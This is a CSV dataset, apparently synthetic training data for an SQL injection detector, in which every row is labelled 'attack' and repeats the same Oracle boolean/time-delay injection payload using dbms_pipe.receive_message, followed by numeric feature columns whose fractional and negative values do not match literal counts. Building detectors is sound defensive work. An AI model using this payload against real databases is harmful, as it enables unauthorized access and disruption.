id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001499,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.536503660617656,175.96484375,48.687618255615234,18.332298278808594,61.31228256225586,0.24943989515304565,43.244258880615234,20.340959548950195,1.2456293106079102,0.3215494453907013,0.19677448272705078,0.3524879217147827,0.16640198230743408,3.495042324066162,1.5824683904647827,0.19196397066116333,1.0697801113128662,0.19420360028743744,0.0531332902610302,-0.16792385280132294,1.946251630783081,7.990568161010742,1.244158387184143,-0.2085779309272766,1.6661354303359985,-0.031232349574565887,-0.2796970009803772,0.7747994661331177,-0.19516971707344055,0.01669139787554741,0.3933228552341461,-0.3666594922542572,-0.1898980736732483,0.3009764850139618,0.2648899257183075,1.537068247795105,5.380020618438721,0.7048771381378174,0.23257027566432953,-0.2553887367248535,0.5449687242507935,0.15983882546424866,-0.0844535380601883,-0.24429379403591156,-0.6155210137367249,0.0773744285106659,0.14070381224155426,0.27528145909309387,0.13730640709400177,0.12648391723632812,0.11948279291391373,0.12126120924949646,-0.24438802897930145,-0.24486450850963593,0.3663032352924347,-0.42062628269195557,0.4119473993778229,0.2558233439922333,0.3370908796787262,-0.34963539242744446,0.014210432767868042,0.19205638766288757,0.13289475440979004,1.423182487487793,-0.3725799322128296,-0.04371189698576927,-0.041946202516555786,0.11869238317012787,0.26586538553237915,0.17415569722652435,0.1519847810268402,0.6344100832939148,0.15500657260417938,0.3015107810497284,0.5611746311187744,0.10604220628738403,0.33445754647254944,0.3825843036174774,-0.36618420481681824,0.2934610843658447,0.25159895420074463,5.434469223022461,0.7171937823295593,-0.11644729971885681,0.05707379803061485,0.2756338119506836,-0.1574268341064453,-0.006340110674500465,-0.4528645873069763
GAN_001500,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.170742053380999,168.2035675048828,48.171592712402344,19.155372619628906,58.2844123840332,0.19050568342208862,40.226905822753906,21.535451889038086,1.1679702997207642,0.32799285650253296,0.181984081864357,0.3630838096141815,0.16599346697330475,3.4848315715789795,1.7818952798843384,0.3676362633705139,1.1139668226242065,0.01532164216041565,0.08674948662519455,-0.2038709819316864,3.74899959564209,7.449520587921143,1.3781938552856445,-0.15668579936027527,1.6081677675247192,0.1128358468413353,-0.2473222315311432,0.7609145641326904,-0.01827075704932213,0.051570069044828415,0.21255794167518616,-0.2157832682132721,-0.026758205145597458,0.11101477593183517,0.31139740347862244,1.745932698249817,5.267529010772705,0.8249252438545227,0.40523239970207214,-0.3390827775001526,0.5173125863075256,0.1721554696559906,-0.059743426740169525,-0.28333383798599243,-0.4030112624168396,0.003439325839281082,0.2508567273616791,0.20139646530151367,0.18488673865795135,0.060331154614686966,0.1688149869441986,0.13362571597099304,-0.2312825471162796,-0.1726510375738144,0.3329716622829437,-0.30404213070869446,0.1695665866136551,0.2564597725868225,0.26410192251205444,-0.1690034419298172,0.04685179144144058,0.06969750672578812,0.023684993386268616,1.6946771144866943,-0.32413384318351746,0.009757685475051403,-0.03408769518136978,0.048679035156965256,0.19595226645469666,0.12940244376659393,0.03645351529121399,0.32930561900138855,0.10598393529653549,0.16901956498622894,0.4563981294631958,0.09156681597232819,0.47604313492774963,0.432987242937088,-0.35135892033576965,0.24493613839149475,0.2640896439552307,5.914652347564697,0.7238773703575134,-0.09434504806995392,0.1869070678949356,0.2657890021800995,-0.35036665201187134,-0.19437046349048615,-0.21548889577388763
GAN_001501,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.403861002293355,165.97190856933594,41.17280578613281,17.804115295410156,50.91401290893555,0.17383573949337006,46.10314178466797,18.763681411743164,1.1815779209136963,0.3393639624118805,0.20168840885162354,0.3585037887096405,0.1673104614019394,3.55953049659729,1.571654200553894,0.36863020062446594,1.0236783027648926,0.05169530212879181,0.04857698455452919,-0.17915549874305725,2.906660795211792,6.534088611602783,1.2379971742630005,-0.29319265484809875,1.5715370178222656,-0.03979571536183357,-0.3990037739276886,0.785053551197052,0.2627885043621063,-0.11416121572256088,0.3334399461746216,-0.4570922255516052,-0.01143736857920885,0.1886812448501587,0.25601619482040405,1.6332709789276123,3.507706880569458,1.0405775308609009,0.15481989085674286,-0.20503230392932892,0.5159910321235657,0.21567495167255402,-0.22610238194465637,-0.4705331325531006,-0.6219884753227234,0.007675930857658386,0.39575591683387756,0.18285180628299713,0.166825532913208,0.06431140005588531,0.10871138423681259,0.09501544386148453,-0.26453477144241333,-0.3452680706977844,0.30399417877197266,-0.36919379234313965,0.3401070833206177,0.22702915966510773,0.24001345038414001,-0.26830023527145386,-0.06193302571773529,0.08479031175374985,0.15152627229690552,1.6930299997329712,-0.41217759251594543,0.012853476218879223,-0.024671202525496483,0.20407408475875854,0.22562699019908905,0.19607986509799957,-0.04041062295436859,0.5380094051361084,0.130585715174675,0.21140779554843903,0.6777826547622681,0.22304771840572357,0.41067731380462646,0.3742866814136505,-0.3912143409252167,0.22504235804080963,0.23109127581119537,6.072381973266602,0.7277701497077942,-0.08812366425991058,0.39492639899253845,0.30856189131736755,-0.2908136546611786,-0.15323364734649658,-0.35759836435317993
GAN_001502,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.238489838408085,177.92965698242188,50.49583435058594,18.511730194091797,53.58926010131836,0.04146438464522362,51.33837127685547,16.249784469604492,1.1703898906707764,0.3472152650356293,0.182291641831398,0.3525729477405548,0.16198979318141937,3.616873264312744,1.6579654216766357,0.5043403506278992,0.6597902774810791,-0.05859198793768883,-0.00545878242701292,0.009613869711756706,4.032243728637695,5.853976726531982,1.5220674276351929,-0.34207144379615784,1.5919592380523682,-0.17364098131656647,-0.5137737989425659,0.5025386810302734,0.3201284110546112,-0.0249759741127491,0.11627967655658722,-0.3229576051235199,-0.11826707422733307,0.14294813573360443,0.2166941612958908,1.6672788858413696,3.2957863807678223,0.9461119771003723,0.009925475344061852,-0.161496102809906,0.5100524425506592,0.19426420331001282,-0.2063361555337906,-0.4124044179916382,-0.5971015691757202,-0.0645550936460495,0.6164174675941467,0.1533844769001007,0.16379742324352264,0.0038749019149690866,0.09958474338054657,0.06082339957356453,-0.2683931291103363,-0.31411486864089966,0.3453431725502014,-0.22849568724632263,0.2780945599079132,0.2639631927013397,0.5024020075798035,-0.13974924385547638,-0.22438615560531616,-0.10589629411697388,-0.06050381809473038,2.269386053085327,-0.2154684066772461,0.08974076807498932,-0.04096265137195587,0.12049411982297897,0.3852316737174988,0.14107558131217957,-0.14842766523361206,0.4811018109321594,0.03706411272287369,0.16110913455486298,0.548682451248169,0.11007332801818848,0.37836483120918274,0.4311552345752716,-0.21359138190746307,0.14883014559745789,0.31850340962409973,5.993349075317383,0.7197813987731934,-0.14637966454029083,0.5143013000488281,0.1741681694984436,-0.4889620840549469,-0.317415714263916,-0.3764494061470032
GAN_001503,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.538728855990745,173.28659057617188,48.993614196777344,18.546710968017578,49.871482849121094,0.23154431581497192,50.833675384521484,17.036684036254883,1.342034935951233,0.34520015120506287,0.19495061039924622,0.3566436171531677,0.1646437793970108,3.5191636085510254,1.435308814048767,0.3177054822444916,1.153762698173523,-0.017320342361927032,0.0279144998639822,-0.06592269241809845,3.1170294284820557,6.601882457733154,1.2737725973129272,-0.4650593400001526,1.5715954303741455,-0.10285580158233643,-0.23736779391765594,0.7169064879417419,-0.0792340338230133,-0.06371449679136276,0.3488558232784271,-0.6071040630340576,-0.0842011421918869,0.32984575629234314,0.24823901057243347,1.5962369441986084,4.692049980163574,1.0628670454025269,-0.07029921561479568,-0.14277172088623047,0.5073106288909912,0.21029725670814514,-0.16612958908081055,-0.2575109004974365,-0.5966826677322388,-0.025848696008324623,0.46511736512184143,0.20423144102096558,0.16956958174705505,0.0463554747402668,0.08454579859972,0.12758508324623108,-0.3387259840965271,-0.29877135157585144,0.33671680092811584,-0.34383007884025574,0.38597992062568665,0.2749965786933899,0.1924889087677002,-0.3103080987930298,-0.017620552331209183,-0.1260877251625061,0.21216678619384766,2.131772041320801,-0.5018991231918335,0.061370112001895905,-0.019374927505850792,0.14763975143432617,0.4426143169403076,0.1383393108844757,0.12140736728906631,0.4946295917034149,0.016560493037104607,0.21546156704425812,0.6060332655906677,0.11155810952186584,0.36028918623924255,0.4314955174922943,-0.36150267720222473,0.21437247097492218,0.3213499188423157,5.967260837554932,0.7279524207115173,-0.1165468692779541,0.40804779529571533,-0.03876037523150444,-0.21790871024131775,-0.08653582632541656,-0.4211065173149109
GAN_001504,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,5.059454932521939,163.097412109375,45.02141571044922,14.89185619354248,58.38373565673828,0.2237011194229126,41.24565505981445,17.906709671020508,1.1844532489776611,0.34884706139564514,0.1981225311756134,0.3559436500072479,0.1678682267665863,3.429384231567383,1.4316688776016235,0.46427950263023376,0.9479861855506897,0.18445180356502533,-0.11780750006437302,-0.1908111572265625,3.0215768814086914,8.321537017822266,0.5700382590293884,-0.3145241141319275,1.4658268690109253,-0.035848136991262436,-0.5626515746116638,0.8936951160430908,-0.36423423886299133,-0.08955904096364975,0.6598167419433594,-0.4335429072380066,-0.263323038816452,0.33000317215919495,0.1805196851491928,1.5262179374694824,3.7664053440093994,0.9454297423362732,0.13710449635982513,-0.5157309770584106,0.6216487884521484,0.12331279367208481,-0.23834942281246185,-0.5050464272499084,-0.6228288412094116,-0.03250473737716675,0.35054492950439453,0.2536988854408264,0.2045576572418213,0.21155983209609985,0.10690430551767349,0.09805978834629059,-0.303263783454895,-0.18290944397449493,0.4439494013786316,-0.30572181940078735,0.47097477316856384,0.39420032501220703,0.44280311465263367,-0.5023767948150635,0.355392187833786,0.23131366074085236,0.10327059775590897,2.8327019214630127,-0.3462735414505005,-0.06087922677397728,-0.07305573672056198,0.16072115302085876,0.4070534110069275,0.18258632719516754,0.09010449051856995,0.6458004117012024,0.2503117024898529,0.3502505421638489,0.7143726944923401,0.17758920788764954,0.15135279297828674,0.34365740418434143,-0.5969394445419312,0.2935735583305359,0.2308054268360138,5.931241512298584,0.6385083794593811,0.023003946989774704,0.3156643807888031,0.3049873411655426,-0.3074820041656494,-0.0823557898402214,-0.5612143874168396
GAN_001505,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.0947677868423,169.27134704589844,40.240901947021484,19.85516929626465,56.63821029663086,0.20116250216960907,37.75621032714844,20.454254150390625,1.3865635395050049,0.3258374333381653,0.19170734286308289,0.37727266550064087,0.16239066421985626,3.4905080795288086,1.393537998199463,0.09655104577541351,1.1599273681640625,0.19632576406002045,0.06135227158665657,-0.0337129645049572,2.853485345840454,7.003049850463867,1.2955372333526611,-0.31556403636932373,1.627252221107483,-0.0399770513176918,-0.1812153458595276,0.5956545472145081,0.4479168951511383,-0.002251882804557681,0.2764315605163574,-0.30908656120300293,-0.04101192578673363,0.0011733174324035645,0.28818389773368835,1.6341233253479004,4.181233882904053,1.03738534450531,0.34157487750053406,-0.09219285845756531,0.5311006307601929,0.1793261021375656,-0.23551391065120697,-0.2175791710615158,-0.3597138822078705,0.09387350082397461,0.32562556862831116,0.10917907953262329,0.0927743911743164,0.12077058106660843,0.06118712201714516,0.11560661345720291,-0.20851418375968933,-0.0952870100736618,0.22502735257148743,-0.3226393759250641,0.09522096812725067,0.26176807284355164,0.17059442400932312,-0.3068000078201294,-0.034548237919807434,0.09378543496131897,0.22658562660217285,1.6806070804595947,-0.45627379417419434,0.02822193130850792,-0.02973419614136219,-0.03942020237445831,0.13253775238990784,-0.06828123331069946,0.1548839658498764,0.40710631012916565,0.01861160434782505,0.06321351230144501,0.5455543994903564,0.24272775650024414,0.4536241292953491,0.4720001518726349,-0.275483101606369,0.24514588713645935,0.23784272372722626,6.263156890869141,0.790942370891571,-0.20622581243515015,0.43342578411102295,0.15716977417469025,-0.14772221446037292,-0.17369817197322845,-0.35279470682144165
GAN_001506,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.417297126387888,150.74420166015625,47.32343292236328,17.329635620117188,52.14509201049805,0.23693059384822845,47.594207763671875,18.372854232788086,1.263765573501587,0.33810070157051086,0.19976294040679932,0.3778449296951294,0.16480368375778198,3.538410186767578,1.2330431938171387,0.32050901651382446,1.1946499347686768,0.10778799653053284,0.08079967647790909,-0.00043479306623339653,3.1686954498291016,6.997538089752197,1.4209959506988525,-0.10460696369409561,1.6576790809631348,0.21857528388500214,-0.1857091188430786,0.7396761775016785,-0.09696295857429504,0.009568433277308941,0.33442696928977966,-0.37034305930137634,0.0017611264484003186,-0.0399133637547493,0.23295383155345917,1.607842206954956,5.369877815246582,1.0545344352722168,0.1943730264902115,-0.47166627645492554,0.5301815271377563,0.26802775263786316,-0.2110396772623062,-0.3118637800216675,-0.4043712913990021,-0.0972970724105835,0.4231715798377991,0.18519523739814758,0.18074624240398407,0.08793584257364273,0.0853940099477768,0.08439073711633682,-0.3112567067146301,-0.1071753278374672,0.5169029831886292,-0.18191874027252197,0.15390333533287048,0.20579172670841217,0.030597154051065445,-0.32617178559303284,0.06779328733682632,0.0024760663509368896,0.36808279156684875,2.094500780105591,-0.3567083477973938,0.0037903664633631706,0.0010595554485917091,0.343584269285202,0.24844831228256226,-0.07399557530879974,0.17932745814323425,0.3604136109352112,0.19468197226524353,0.3984012007713318,0.5145883560180664,0.2469358742237091,0.5587329864501953,0.41113147139549255,-0.35627907514572144,0.23140516877174377,0.11807210743427277,5.006688117980957,0.7853973507881165,-0.03249248117208481,0.4560394883155823,0.21335788071155548,-0.25243908166885376,0.014582369476556778,-0.540152370929718
GAN_001507,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.621788085340799,146.7356414794922,37.22930145263672,18.420141220092773,46.07733917236328,0.1749313920736313,26.44683074951172,18.461204528808594,1.2654800415039062,0.31789353489875793,0.1767086386680603,0.36341333389282227,0.1683526337146759,3.3925137519836426,1.4925297498703003,0.40663158893585205,1.0331618785858154,0.30201655626296997,0.03830873593688011,-0.353500634431839,1.5247523784637451,6.745538234710693,0.8363674283027649,-0.30603283643722534,1.5795390605926514,-0.05479324609041214,-0.24945497512817383,0.6926565766334534,0.19288286566734314,0.010276625864207745,0.3846661150455475,-0.3715413212776184,-0.06170613691210747,-0.07283977419137955,0.21412061154842377,1.7428430318832397,3.9844114780426025,0.7218552827835083,0.35873618721961975,-0.2218281477689743,0.4842195510864258,0.08363702148199081,-0.08637253195047379,-0.28606855869293213,-0.6115215420722961,-0.01917514204978943,0.3819333016872406,0.20255903899669647,0.13889648020267487,0.08146830648183823,0.05568907782435417,0.047196049243211746,-0.2555399537086487,-0.2685767412185669,0.2858537435531616,-0.25078892707824707,0.1319352239370346,0.44328969717025757,0.4052092432975769,-0.30449748039245605,0.05988309532403946,0.26955318450927734,0.20473504066467285,1.366894245147705,-0.5614949464797974,-0.024801213294267654,-0.11211629211902618,-0.01833060383796692,0.23980467021465302,0.07520650327205658,0.40356314182281494,0.5513290166854858,0.03566306084394455,0.2740541994571686,0.6932690739631653,0.1618417501449585,0.2486119568347931,0.49577099084854126,-0.40562912821769714,0.26211896538734436,0.3661176860332489,5.086381912231445,0.7393571138381958,-0.21240486204624176,0.21039986610412598,0.3384094536304474,-0.5100454688072205,-0.31232261657714844,-0.5425515174865723
GAN_001508,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.256228520640703,172.21820068359375,46.976131439208984,19.901283264160156,54.098854064941406,0.23940150439739227,46.087284088134766,15.013050079345703,1.22953462600708,0.35344547033309937,0.19172096252441406,0.3560045659542084,0.15964381396770477,3.609285354614258,1.5957828760147095,0.4113990366458893,1.081327199935913,0.12319597601890564,0.12285974621772766,-0.06553085893392563,3.038252115249634,6.510089874267578,1.420594334602356,-0.40114912390708923,1.652089238166809,-0.03812582418322563,-0.3123783469200134,0.45777446031570435,0.1075449287891388,0.08892358094453812,0.34240633249282837,-0.23811295628547668,-0.06686675548553467,0.27565258741378784,0.3722177743911743,1.6230641603469849,3.505530834197998,0.7933861613273621,0.18127377331256866,-0.2709093689918518,0.4953385591506958,0.1369553655385971,-0.0637638121843338,-0.04207584261894226,-0.4879417419433594,0.10971492528915405,0.4210566282272339,0.12868334352970123,0.13701745867729187,0.06353063881397247,0.10969246923923492,0.09803494811058044,-0.11427690833806992,-0.3718881607055664,0.28230947256088257,-0.32875722646713257,0.41343599557876587,0.10359911620616913,0.40690574049949646,-0.3253061771392822,-0.11723016202449799,0.11275003850460052,-0.0031637176871299744,1.5832974910736084,-0.16036361455917358,0.038227375596761703,-0.02944660373032093,0.220396488904953,0.3746439218521118,-0.00897391140460968,-0.020164556801319122,0.4342131018638611,0.030519699677824974,0.1823781430721283,0.5744609832763672,0.12977483868598938,0.43022245168685913,0.4640115201473236,-0.2962566316127777,0.22194215655326843,0.31034988164901733,7.003960609436035,0.7674358487129211,-0.05720115080475807,0.1633542776107788,0.07386258244514465,-0.010155156254768372,-0.017437899485230446,-0.2971789240837097
GAN_001509,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.451699066676928,167.91566467285156,38.439353942871094,22.12220573425293,56.61832046508789,0.15985240042209625,38.18177032470703,16.56343650817871,1.3401367664337158,0.34679174423217773,0.1890711784362793,0.35930219292640686,0.16093392670154572,3.421483039855957,1.7532734870910645,0.3229784071445465,1.0321398973464966,0.2815377712249756,0.02803385816514492,-0.1310718059539795,2.3437108993530273,7.632727146148682,1.2643197774887085,-0.20165520906448364,1.5677266120910645,-0.11501900851726532,-0.34226661920547485,0.5399304628372192,0.3164443075656891,0.05077255889773369,0.4449739158153534,-0.16022734344005585,-0.13284535706043243,0.3331782817840576,0.33908984065055847,1.7069395780563354,3.485455274581909,0.88031405210495,0.38424474000930786,-0.3399786353111267,0.5446733832359314,0.06628181785345078,-0.1486901044845581,0.04451519250869751,-0.6191138029098511,0.19797860085964203,0.49394145607948303,0.14652439951896667,0.16039934754371643,0.09131861478090286,0.1169692799448967,0.10163597762584686,-0.20317813754081726,-0.3388197422027588,0.27634719014167786,-0.24010029435157776,0.26308032870292664,0.22032754123210907,0.44033029675483704,-0.24711927771568298,-0.10197025537490845,0.3692992329597473,-0.10156948864459991,1.3974899053573608,-0.19482892751693726,0.00014346381067298353,-0.10043682157993317,-0.0481741800904274,0.27481502294540405,-0.0542113371193409,0.09964130073785782,0.5534968972206116,0.15176652371883392,0.09223280847072601,0.7705956101417542,0.15376558899879456,0.24099662899971008,0.3857887387275696,-0.26261699199676514,0.2833450436592102,0.3894037902355194,6.837224960327148,0.7245979905128479,-0.030931955203413963,0.3150961697101593,0.336326539516449,-0.34530454874038696,-0.13059905171394348,-0.2606929540634155
GAN_001510,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.459020295399085,191.61488342285156,43.560157775878906,21.474407196044922,66.00985717773438,0.20945671200752258,47.95124053955078,20.186214447021484,1.1934070587158203,0.34208184480667114,0.17898671329021454,0.3670557141304016,0.1546381562948227,3.472102642059326,2.0621819496154785,0.2336142510175705,1.217644214630127,0.22280029952526093,0.07012125104665756,-0.0682445764541626,3.988546848297119,8.679768562316895,1.256443977355957,-0.3509320020675659,1.5854158401489258,0.011088313534855843,-0.35782331228256226,0.7553905844688416,-0.04710271582007408,0.03388826176524162,0.3841666579246521,-0.32874348759651184,-0.12410326302051544,0.3388631045818329,0.3745298981666565,1.5897334814071655,4.431306838989258,0.9207039475440979,0.30197063088417053,-0.15830260515213013,0.5639693140983582,0.174005925655365,-0.05011509358882904,-0.32853060960769653,-0.26442575454711914,0.18648257851600647,0.16741667687892914,0.17707066237926483,0.1298172026872635,0.18589642643928528,0.1326829493045807,0.1725751906633377,-0.11553828418254852,-0.08048897236585617,0.47921305894851685,-0.4016139507293701,0.2508561909198761,0.19853326678276062,0.3591596782207489,-0.508945882320404,0.06129077076911926,0.29888349771499634,0.012777335941791534,1.740188479423523,-0.3596527576446533,-0.028767254203557968,-0.04620485007762909,-0.1393481194972992,0.19386297464370728,0.0998828113079071,-0.10756742209196091,0.3933812081813812,0.3020252585411072,0.05950232595205307,0.5186832547187805,0.05353359505534172,0.444441556930542,0.3076198697090149,-0.24749580025672913,0.2350461781024933,0.281965047121048,6.172016620635986,0.6622112989425659,0.1162765622138977,0.3742404580116272,0.17870834469795227,-0.027384035289287567,-0.025870971381664276,-0.06618611514568329
GAN_001511,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.918002114578799,158.57081604003906,38.49852752685547,16.76150131225586,50.75719451904297,0.23334790766239166,27.512033462524414,17.27389144897461,1.1024186611175537,0.33156004548072815,0.19680507481098175,0.3500377833843231,0.17218747735023499,3.5183186531066895,1.819886565208435,0.4480702877044678,1.2657550573349,0.3905128836631775,0.0419166125357151,-0.37094902992248535,1.3442485332489014,7.845614433288574,0.8713513016700745,-0.31361138820648193,1.510870337486267,0.11219550669193268,-0.2502252161502838,0.7887610197067261,0.10831466317176819,-0.15864647924900055,0.32230284810066223,-0.5750072002410889,-0.15447688102722168,0.2071910798549652,0.31231689453125,1.6373354196548462,5.223738670349121,0.760552167892456,0.17965136468410492,-0.32104602456092834,0.5211353898048401,0.126435324549675,-0.027558833360671997,-0.423603892326355,-0.807823657989502,-0.0795215517282486,0.3034992814064026,0.2676600217819214,0.20191136002540588,0.10527446120977402,0.11204487085342407,0.14426350593566895,-0.24035818874835968,-0.31371888518333435,0.5585256218910217,-0.40190231800079346,0.45651477575302124,0.2557770311832428,0.2990029454231262,-0.5503410696983337,-0.0508439801633358,0.26518458127975464,0.14293184876441956,1.7647123336791992,-0.5062508583068848,-0.016127008944749832,-0.04317227005958557,0.04888630658388138,0.22062286734580994,0.12943118810653687,0.16125065088272095,0.6764950156211853,0.13396337628364563,0.3650673031806946,0.7904328107833862,0.14431065320968628,0.35195714235305786,0.38036295771598816,-0.531527578830719,0.28338995575904846,0.14169685542583466,4.8646955490112305,0.6529794931411743,-0.02039039134979248,0.13396309316158295,0.11468803882598877,-0.12687057256698608,-0.10477466881275177,-0.5112272500991821
GAN_001512,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.567778437503438,189.6754150390625,53.959449768066406,18.837255477905273,60.332664489746094,0.12247775495052338,44.1200065612793,19.1280517578125,1.3863434791564941,0.36259594559669495,0.19355739653110504,0.3711504340171814,0.16011759638786316,3.4683101177215576,1.7394099235534668,0.1937008798122406,1.08561372756958,0.08767589926719666,0.049501772969961166,-0.005596230737864971,2.3822147846221924,8.599455833435059,1.1898272037506104,-0.4689483344554901,1.6407787799835205,0.03493567928671837,-0.5041449069976807,0.5896098613739014,-0.05863025411963463,-0.01670973375439644,0.5865940451622009,-0.36243516206741333,-0.11366811394691467,0.10711519420146942,0.3541714549064636,1.5579851865768433,4.435274600982666,0.8156054019927979,0.2712317705154419,-0.27907708287239075,0.5006310343742371,0.19782352447509766,-0.2528225779533386,0.0032391026616096497,-0.4028398394584656,0.19920538365840912,0.24838900566101074,0.21700456738471985,0.15272805094718933,0.1331959068775177,0.10535258799791336,0.1433204561471939,-0.37812572717666626,-0.1204039454460144,0.4449270963668823,-0.24373412132263184,0.1735585480928421,0.2544991374015808,0.3945596218109131,-0.5355907678604126,-0.009582575410604477,0.14111900329589844,0.09272446483373642,1.017573595046997,-0.33725693821907043,-0.014380921609699726,-0.03481467068195343,-0.09141461551189423,0.34036487340927124,-0.009896479547023773,-0.04272723197937012,0.3162180483341217,0.1348491907119751,-0.153555765748024,0.5827152729034424,0.08506456762552261,0.4194292724132538,0.3466190993785858,-0.4233670234680176,0.303205668926239,0.10023865103721619,6.905647277832031,0.7217201590538025,-0.11025665700435638,0.2726686894893646,0.22913441061973572,-0.13653171062469482,0.04266552999615669,-0.46289288997650146
